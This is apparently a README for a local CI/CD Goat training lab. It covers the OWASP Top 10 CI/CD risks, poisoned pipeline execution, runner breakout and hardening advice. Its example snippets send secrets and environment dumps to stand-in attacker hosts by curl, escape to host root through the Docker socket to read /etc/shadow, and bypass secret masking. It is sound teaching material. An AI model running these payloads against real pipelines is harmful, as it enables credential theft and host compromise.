# Cider Security CI/CD Goat: OWASP Top 10 CI/CD Security Risks & Poisoned Pipeline Execution (PPE)

## Overview

**CI/CD Goat** (developed by Cider Security, now part of Palo Alto Networks) is the premier "vulnerable by design" educational environment designed to teach security engineers, red teamers, and DevOps practitioners how to attack and defend modern continuous integration and continuous deployment pipelines.

As engineering organizations shift toward rapid automated delivery, the CI/CD pipeline has become the most privileged attack vector in modern enterprises. Pipelines possess direct access to production secrets, cloud IAM credentials, code repositories, internal networks, and package registries.

This lab provisions the CI/CD Goat CTFd challenge platform preloaded with CTF flags and scenarios mapped directly to the **OWASP Top 10 CI/CD Security Risks**.

- **CTFd Challenge Portal**: `http://localhost:8112`
- **Internal Port**: `8000`
- **Container Name**: `cyberlab_cicd_ctfd`
- **Modular Profile**: Supports standalone CTFd mode or full infrastructure mode (`--profile full` for Gitea on 3004 and Jenkins on 8113)
- **Directory**: `Real_World_Industry_Labs/03_devsecops_ci_cd_poisoning/cicd_goat`

---

## Quick Start & Lab Profiles

### Mode 1: CTFd Challenge Portal (Default & Lightweight)
Launches the full interactive CTFd challenge platform with problem descriptions, clues, and flag submission forms:

```bash
cd Real_World_Industry_Labs/03_devsecops_ci_cd_poisoning/cicd_goat

# Launch the CTFd portal on port 8112
docker compose up -d

# Access in browser: http://localhost:8112
```

### Mode 2: Full Infrastructure Mode (CTFd + Gitea + Jenkins + Runner Agent)
Launches the complete live attack lab with local VCS (Gitea) and CI/CD server (Jenkins):

```bash
# Start all services with the 'full' profile
docker compose --profile full up -d

# Endpoints:
# - CTFd Challenges: http://localhost:8112
# - Gitea VCS:       http://localhost:3004
# - Jenkins Master:  http://localhost:8113
```

---

## The OWASP Top 10 CI/CD Security Risks (Cider Security Taxonomy)

```
+---------------------------------------------------------------------------------------------------------+
|                                    CI/CD ATTACK SURFACE TAXONOMY                                        |
+---------------------------------------------------------------------------------------------------------+
|  1. Insufficient Flow Control      --> Pushing directly to prod branches without peer reviews           |
|  2. Inadequate Identity & IAM      --> Shared service accounts, machine tokens with wildcard scopes      |
|  3. Dependency Chain Abuse         --> Typosquatting, dependency confusion, compromised packages       |
|  4. Poisoned Pipeline Exec (PPE)   --> Injecting malicious commands via pull requests or build scripts   |
|  5. Insufficient Pipeline PBAC     --> Workflows holding permissions exceeding their task requirements   |
|  6. Insufficient Credential Hygiene--> Hardcoded secrets, static tokens in logs, unmasked variables     |
|  7. System Insecurities            --> Unhardened runners, docker.sock mounted inside build containers  |
|  8. Ungoverned 3rd Party Services  --> Shadow CI plugins, untracked GitHub Marketplace actions          |
|  9. Improper Artifact Validation   --> Tampered container images, unsigned releases without SLSA       |
| 10. Insufficient Visibility        --> Missing pipeline audit logs, blind spots during build steps      |
+---------------------------------------------------------------------------------------------------------+
```

| ID | Vulnerability Title | Core Impact | Real-World Scenario |
|:---|:--------------------|:------------|:--------------------|
| **CICD-SEC-1** | **Insufficient Flow Control** | Unauthorized code pushes to production | Branch protection missing; an attacker with developer commit access directly pushes a backdoor to `main`. |
| **CICD-SEC-2** | **Inadequate Identity & Access Management** | Lateral movement & privilege escalation | Personal Access Tokens (PATs) or CI machine tokens assigned Organization Owner or administrative AWS roles. |
| **CICD-SEC-3** | **Dependency Chain Abuse** | Compromised third-party packages | Pipeline fetches packages from public npm/PyPI without checking internal namespace scopes (dependency confusion). |
| **CICD-SEC-4** | **Poisoned Pipeline Execution (PPE)** | Arbitrary command execution on build runners | An attacker modifies the pipeline configuration or a build script via PR to steal secrets. |
| **CICD-SEC-5** | **Insufficient Pipeline PBAC** | Build jobs stealing production credentials | A linting or testing job on an untrusted branch has read access to production deployment keys. |
| **CICD-SEC-6** | **Insufficient Credential Hygiene** | Long-lived credential leakage | Static AWS keys or production passwords stored in plain text environment variables rather than OIDC or dynamic Vault secrets. |
| **CICD-SEC-7** | **System Insecurities (Runner Breakout)** | Compromise of host node and runner fleet | Self-hosted runner mounts `/var/run/docker.sock`, allowing container escape to host root. |
| **CICD-SEC-8** | **Ungoverned 3rd Party Usage** | Supply chain backdoors via CI extensions | Pipeline uses an unpinned GitHub Action (`uses: action@master`) that gets hijacked upstream. |
| **CICD-SEC-9** | **Improper Artifact Integrity Validation** | Delivery of modified artifacts to customers | Build artifact or Docker container is modified on the registry before deployment because signatures (Cosign) are absent. |
| **CICD-SEC-10**| **Insufficient Logging & Visibility** | Undetected intrusion and data theft | Pipeline runs do not ship execution logs to SIEM; audit logs for secret access are disabled. |

---

## Attack Vector 1: Poisoned Pipeline Execution (PPE)

**Poisoned Pipeline Execution (PPE)** occurs when an attacker with write or pull-request access to a repository manipulates the CI pipeline instructions to execute malicious code within the context of the build runner.

```
       [ Attacker / Contributor ]
                   |
     (1) Creates malicious PR
                   v
+---------------------------------------+
|  Source Code Repository               |
|  - .github/workflows/ci.yml (Direct)  |
|  - package.json / Makefile (Indirect) |
+---------------------------------------+
                   |
     (2) Triggers automated CI run
                   v
+---------------------------------------+
|  CI/CD Runner (GitHub / Jenkins)      |
|  - Executes attacker's bash command   |
|  - Access to ENV & Secrets            |
+---------------------------------------+
                   |
     (3) Exfiltrates AWS / Vault keys
                   v
        [ Attacker C2 / Webhook ]
```

### 1. Direct PPE
The attacker directly modifies the pipeline configuration file:
- `.github/workflows/build.yml`
- `.gitlab-ci.yml`
- `Jenkinsfile`

```yaml
# Malicious snippet injected into pipeline YAML
- name: Run Tests
  run: |
    # Legitimate test command
    npm test || true
    # Attacker payload
    curl -s http://attacker.com/steal?token=$PROD_AWS_SECRET_KEY
```

### 2. Indirect PPE
Many organizations protect their `.github/workflows/` or `.gitlab-ci.yml` files using branch protection rules and CODEOWNERS. However, the workflow still runs developer-controlled build scripts!
If the workflow runs:
```yaml
run: make test
```
The attacker modifies `Makefile` in their PR without touching the protected workflow file:
```makefile
test:
	@echo "Running tests..."
	@curl -s https://attacker-webhook.site/log -d "$$(env)"
```
Because the workflow file was not changed, automated scanners and CODEOWNERS approvals are often completely bypassed.

### 3. Public PPE (The `pull_request_target` Trap)
In GitHub Actions, `on: pull_request_target` runs in the context of the base branch and has access to repository secrets, even when triggered by a fork!
If the workflow checks out the untrusted fork's code:
```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # DANGEROUS!
      - run: npm install && npm test
        env:
          PROD_DEPLOY_KEY: ${{ secrets.PROD_DEPLOY_KEY }}
```
Any external contributor on the Internet can submit a PR that steals `PROD_DEPLOY_KEY`.

---

## Attack Vector 2: Build Runner Breakout & Shared Runner Abuse

### Threat Model: The Docker Socket Trap
In many organizations, self-hosted runners are deployed with Docker installed to allow jobs to build container images ("Docker-in-Docker"). To save compute costs or simplify setups, administrators mount the host's Docker socket:

```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
```

### Exploitation Walkthrough
Any command running inside the build container can communicate directly with the host's Docker daemon. Since Docker daemon runs as `root` on the host, this yields immediate root escape!

```bash
# 1. Verify access to Docker socket inside the CI runner container
ls -la /var/run/docker.sock

# 2. Launch a privileged container mounting the entire host filesystem to /host
docker run --rm -it -v /:/host alpine chroot /host /bin/bash

# 3. Inside the host root shell:
# Steal all runner tokens, host AWS IAM instance credentials, and SSH keys
cat /root/.ssh/authorized_keys
cat /etc/shadow
```

---

## Attack Vector 3: Credential Exfiltration & Secret Masking Bypasses

CI/CD engines attempt to "mask" secrets printed to console output by replacing known secret strings with `***`. However, secret masking is purely a string-matching filter on stdout and can be effortlessly bypassed:

### 1. Base64 & Hex Encoding
```bash
echo -n "$SECRET_AWS_KEY" | base64
# Masker fails because the base64 string does not match the plaintext secret
```

### 2. Character Splitting & Inverted Formatting
```bash
echo "$SECRET_TOKEN" | sed 's/./& /g'
# Prints characters separated by spaces: s e c r e t _ v a l u e
```

### 3. Memory & Process Inspection
```bash
# Inspect all environment variables of the running runner processes
cat /proc/1/environ | tr '\0' '\n'
```

### 4. Direct Out-of-Band Exfiltration
```bash
curl -X POST https://webhook.site/uuid -d "key=$SECRET_AWS_KEY"
```

---

## CI/CD Goat Flag Walkthrough Reference

| Challenge Name | OWASP Risk | Objective & Key Technique |
|:---|:---|:---|
| **White Rabbit** | CICD-SEC-4 (Direct PPE) | Analyze repository history, discover pipeline execution flaws, and modify pipeline to extract runner secrets. |
| **Mad Hatter** | CICD-SEC-7 (Runner Breakout) | Break out of the unhardened build runner environment using privileged container mounts and extract credentials. |
| **Cheshire Cat** | CICD-SEC-3 (Dependency Abuse) | Exploit an unvetted package dependency in the build pipeline to achieve remote code execution. |
| **Tweedledee** | CICD-SEC-2 (IAM & Tokens) | Enumerate excessive GitHub Personal Access Token permissions and escalate privileges to org admin. |
| **Dodo** | CICD-SEC-6 (Credential Hygiene) | Discover leaked credentials stored in commit logs or unmasked build job outputs. |
| **Queen of Hearts** | CICD-SEC-9 (Artifact Tampering) | Intercept build artifacts before release and poison production binaries. |

---

## Defensive Remediation & Pipeline Hardening

1. **Enforce Ephemeral Runners**: Use disposable, single-use container runners (e.g. GitHub Actions Runner Controller on Kubernetes) that are destroyed immediately after job completion.
2. **Never Mount Docker Socket**: Use rootless container builders such as **Kaniko**, **Buildah**, or **makisu** to build Docker images without requiring access to `/var/run/docker.sock`.
3. **Use OpenID Connect (OIDC)**: Eliminate static cloud credentials from CI. Use GitHub/GitLab OIDC tokens to assume temporary short-lived AWS/GCP/Azure IAM roles:
   ```yaml
   permissions:
     id-token: write
     contents: read
   ```
4. **Require Approvals for First-Time Contributors**: Set "Require approval for all outside collaborators" in repository workflow settings.
5. **Static Analysis for CI/CD**: Run tools like **zizmor** and **actionlint** on pipeline definitions to catch injection flaws and dangerous `pull_request_target` usage.

---

## Verified YouTube Walkthroughs & Lectures

All video links have been verified active via the YouTube oEmbed API (`HTTP 200 OK`):

- [Security Weekly - A CRA Resource: The Top 10 CI/CD Security Risks and CI/CD Goat - Daniel Krivelevich](https://www.youtube.com/watch?v=iwbih130UOs) — Cider Security co-founder Daniel Krivelevich discusses the genesis of CI/CD Goat and the top CI/CD risks.
- [Continuous Delivery Foundation - Abusing CI/CD: Top Ways to Reach Production - Omer Gil, Cider Security](https://www.youtube.com/watch?v=SZ5QaCNt-mA) — Omer Gil presents attack paths from source code to production cloud takeovers.
- [John Hammond - CI/CD GOAT: Mad Hatter Capture The Flag](https://www.youtube.com/watch?v=EgE1i3AcUX8) — John Hammond’s step-by-step CTF walkthrough of breaking out of runners and solving CI/CD Goat challenges.
- [BSidesLV - Climbing the Production Mountain: Practical CI/CD Attacks Using CI/CD Goat](https://www.youtube.com/watch?v=w-R2PT2jfdU) — Real-world offensive demonstration exploiting build runners, supply chains, and poisoned pipelines.
- [OWASP DevSlop - Top 10 CI/CD Security Risks](https://www.youtube.com/watch?v=i1SO8AH4AxI) — Detailed walkthrough of the OWASP CI/CD Top 10 matrix with defensive recommendations.
- [SpecterOps - Your CI/CD Pipeline is My Attack Path: Graphing GitHub OIDC to Cloud Takeover](https://www.youtube.com/watch?v=97HQ_Y3DBbM) — In-depth research on attacking misconfigured OIDC trust policies in cloud providers.
- [CYBERWOX - DevSecOps: Indirect Poisoned Pipeline Execution](https://www.youtube.com/watch?v=DVF-Q9XuXW0) — Practical exploitation of indirect PPE via poisoned build scripts and Makefile manipulation.
- [Kunal Pachauri - DevSecOps #1: Implementing Secure CI/CD Pipelines](https://www.youtube.com/watch?v=egTi9U9vw3E) — Defensive patterns, security gates, and automated scanning for enterprise CI/CD.

---

## Quick CLI Control
From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Stop this lab
cd Real_World_Industry_Labs/03_devsecops_ci_cd_poisoning/cicd_goat && docker compose down
```
